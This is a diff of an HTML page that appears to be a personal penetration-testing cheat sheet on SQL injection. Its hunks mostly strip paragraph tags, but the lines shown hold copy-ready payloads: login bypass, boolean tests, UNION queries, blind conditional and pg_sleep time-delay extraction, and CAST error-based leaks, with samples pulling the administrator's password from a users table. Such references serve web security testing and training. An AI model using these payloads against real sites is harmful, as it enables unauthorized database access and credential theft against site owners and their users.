@@ -32,7 +32,7 @@
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
 <details>
 <summary>DEFAULT TEST ATTEMPTS</summary>
-<p><b>DESCRIPTION:</b> List of the normal characters used to test the vulnerability. 
+<b>DESCRIPTION:</b> List of the normal characters used to test the vulnerability. 
 	
 Getting errors can represent the presence of the vulnerability. <b>[HTTP/2 500 Internal Server Error]</b>
 	
@@ -43,12 +43,13 @@ Getting errors can represent the presence of the vulnerability. <b>[HTTP/2 500 I
 <b>C5: </b><mark id="HDT005">""</mark>
 <b>C6: </b><mark id="HDT006">'#</mark>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT001')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT002')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT003')">.C3.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT004')">.C4.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT005')">.C5.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT006')">.C6.</button></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT001')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT002')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT003')">.C3.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT004')">.C4.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT005')">.C5.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT006')">.C6.</button>
 <b>NOTE:</b> It is needed to check the behavior of the application GUI and headers [<b>burpsuite</b>].	
+
 </details>
 <details>
 <summary>HIDDEN DATA TECHNIQUES</summary>
-<p><b>DESCRIPTION:</b> It will use some boolean conditions in order to retrieve content from the database.
+<b>DESCRIPTION:</b> It will use some boolean conditions in order to retrieve content from the database.
 
 If the vulnerability is present the goal is to "close" the query and retrieve all, for that boolean conditions are used.
 	
@@ -57,20 +58,22 @@ If the vulnerability is present the goal is to "close" the query and retrieve al
 <b>SAMPLE: </b><mark id="">' or 1=1-- -</mark>
 <b>C2: TRUE </b><mark id="HDT02">' and 'a'='a--</mark>
 <b>C3: FALSE </b><mark id="HDT03">' and 1=2;--</mark><br>
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT03')">.C3.</button></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT03')">.C3.</button>
+
 </details>
 <details>
 <summary>LOGIN BYPASS TECHNIQUES</summary>
-<p><b>DESCRIPTION:</b> It is used to bypass login forms, guessing users or after collecting some of them.
+<b>DESCRIPTION:</b> It is used to bypass login forms, guessing users or after collecting some of them.
 
 <u>SAMPLE:</u>
 	
 <b>C1: </b><mark id="LBT01">USER'--</mark><br>
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LBT01')">.C1.</button></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LBT01')">.C1.</button>
+	
 </details>
 <details>
 <summary>DATABASE TYPE/VERSION/NUMBER TECHNIQUES</summary>
-<p><b>DESCRIPTION:</b> Techniques used to retrieve the database version, columns number, field type, etc.
+<b>DESCRIPTION:</b> Techniques used to retrieve the database version, columns number, field type, etc.
 
 <b>--</b> or <b>#</b> | Are used in SQL query language to comment ignoring the rest of the query. <br>
 	
@@ -117,7 +120,7 @@ Also, for ORACLE the select statement <u>is needed a table to search from</u>, i
 </details>
 <details>
 <summary>LISTING DATABASE CONTENT TECHNIQUES</summary>
-<p><b>DESCRIPTION:</b> Used to retrieve the name of table, columns, etc. to retrieve content from database. 
+<b>DESCRIPTION:</b> Used to retrieve the name of table, columns, etc. to retrieve content from database. 
 <details>
 <summary>NON-ORACLE</summary>
 <b>PRE-REQS:</b>
@@ -159,11 +162,11 @@ Also, for ORACLE the select statement <u>is needed a table to search from</u>, i
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT05')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT06')">.C3.</button></p>
 </details>
 <b>NOTE:</b> Both ways needs to know the column number, field type and both examples are assuming it has two 
-columns and both type string.</p>
+columns and both type string.
 </details>
 <details>
 <summary>UNION ATTACKS TECHNIQUES</summary>
-<p><b>DESCRIPTION:</b> If the vulnerability is present, UNION attacks can be used to retrieve content
+<b>DESCRIPTION:</b> If the vulnerability is present, UNION attacks can be used to retrieve content
 from other tables.
 
 <b>::: STEP1:</b> GET QUERY COLUMNS NUMBER
@@ -181,7 +184,7 @@ from other tables.
 
 ... after those steps, please refer to <b>LISTING DATABASE CONTENT TECHNIQUES</b>, it will apply the same.
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT03')">.C3.</button></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT03')">.C3.</button>
 <b>:::: FILTER BYPASS VIA XML ENCODING</b>
 
 <b>NOTE: </b><br>
@@ -212,7 +215,7 @@ from other tables.
 </details>
 <details>
 <summary>BLIND ATTACKS TECHNIQUES</summary>
-<p><b>DESCRIPTION:</b> Simple boolean conditions can help to detect how different the site behaves. Look for any new behavior after small changes. 
+<b>DESCRIPTION:</b> Simple boolean conditions can help to detect how different the site behaves. Look for any new behavior after small changes. 
 Inspect the headers in burpsuite to check if exist something querying the application. 
 <details>
 <summary>CONDITIONAL RESPONSES</summary>	
@@ -278,14 +281,13 @@ with each letter, number, etc. For that reason a pre-req is to know the value le
 
 <b>C1: </b><mark id="BAT09">' AND (SELECT SUBSTRING(COLUMN_NAME,<b>§1§</b>,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='<b>§a§</b></mark>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT09')">.C1.</button></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT09')">.C1.</button>
 
 <b>NOTE:</b> Remember the TRUE/FALSE logic and the response associated to that. That will help to know which 
 values are correct = TRUE. 
 </details>
 <details>
 <summary>CONDITIONAL ERRORS</summary>
-
 <b>NOTE:</b> [HTTP/2 500 Internal Server Error], error will act similar to the TRUE/FALSE logic. If error appears, FALSE. If not, TRUE. 
 
 <u>::: CONFIRM SERVER IS INTERPRETING THE INJECTION AS A SQL QUERY</u><br>
@@ -344,7 +346,7 @@ dissapears, meaning the final value is the total lenght.
 
 <details>
 <summary>VISIBLE ERROR-BASED</summary>
-<p><b>DESCRIPTION: </b> try the different default test attempts, first need a valid syntactically query. You can determine that looking for errors. 
+<b>DESCRIPTION: </b> try the different default test attempts, first need a valid syntactically query. You can determine that looking for errors. 
 
 <u>::: 1. CREATE A GENERIC SELECT SUBQUERY AND CAST THE RETURNED VALUE TO AN INT DATA TYPE</u>
 
@@ -374,12 +376,12 @@ valid syntax format.
 <b>NOTE: </b> After getting a valid user, you can use the same methodology to leak the password.
 
 <b>SAMPLE: </b><mark>' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</mark>
-</p>
+
 </details>	
 </details>
 <details>
 <summary>TIME DELAY TECHNIQUES</summary>
-<p><b>DESCRIPTION: </b> Techniques used to retrieve data from database, used when there's no visible results, no errors present, etc. However,
+<b>DESCRIPTION: </b> Techniques used to retrieve data from database, used when there's no visible results, no errors present, etc. However,
 since the query is executed synchronously, it is possible to trigger conditional time delays get results. 
 
 <b>::: 1. IDENTIFY IF TIME DELAY TECHNIQUE CAN BE USED [10 seconds]</b>
@@ -427,7 +429,7 @@ Send series of requests modifying the character count,
 
 <b><u>::: CONFIRM CHARACTER VALUE ITERATING POSITIONS</u></b>
 
-<b>C3: </b><p id="TDT06"><mark>';SELECT CASE WHEN (COLUMN_NAME='VALUE' AND SUBSTRING(COLUMN_NAME,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM TABLE_NAME--</mark></p>
+<b>C3: </b><mark id="TDT06">';SELECT CASE WHEN (COLUMN_NAME='VALUE' AND SUBSTRING(COLUMN_NAME,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM TABLE_NAME--</mark>
 <b>SAMPLE: </b><mark>';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</mark>
 
 <b>NOTE: </b> using substring() functions can help to extract a single character to compare it.
@@ -438,17 +440,15 @@ Send series of requests modifying the character count,
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT06')">.C3.</button>
 	
-</p>
 </details>
 <details>
 <summary>OUT-OF-BAND TECHNIQUES</summary>
-<p><b>DESCRIPTION: </b></p>
+<b>DESCRIPTION: </b>
 </details>
-</p>
 </details>
 <details>
 <summary>ERROR-BASED TECHNIQUES</summary>
-<p><b>DESCRIPTION: </b></p>
+<b>DESCRIPTION: </b>
 </details>
 </div>
 </pre>
